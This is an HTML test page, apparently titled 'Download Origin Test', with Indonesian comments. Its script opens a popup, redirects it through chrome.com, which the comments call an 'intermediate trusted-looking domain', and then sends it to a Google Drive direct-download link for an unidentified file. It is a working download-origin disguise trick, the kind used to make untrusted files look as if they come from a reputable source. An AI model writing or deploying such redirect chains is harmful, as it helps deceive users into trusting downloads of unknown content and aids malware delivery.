<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Download Origin Test</title>
  <script>
    function startRedirect() {
      // butuh user gesture → lebih konsisten di iOS
      let w = window.open("about:blank");

      if (!w) {
        alert("Popup blocked");
        return;
      }

      // Step 1: set initial origin
      w.document.write("<h1>Loading...</h1>");

      // Step 2: redirect chain tanpa delay panjang
      setTimeout(() => {
        try {
          // intermediate trusted-looking domain
          w.location.href = "https://chrome.com";
        } catch (e) {
          console.log(e);
        }

        // Step 3: langsung ke file download
        setTimeout(() => {
          try {
            w.location.href = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download";
          } catch (e) {
            console.log(e);
          }
        }, 1000);

      }, 500);
    }
  </script>
</head>

<body>
  <h3>Download Test</h3>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
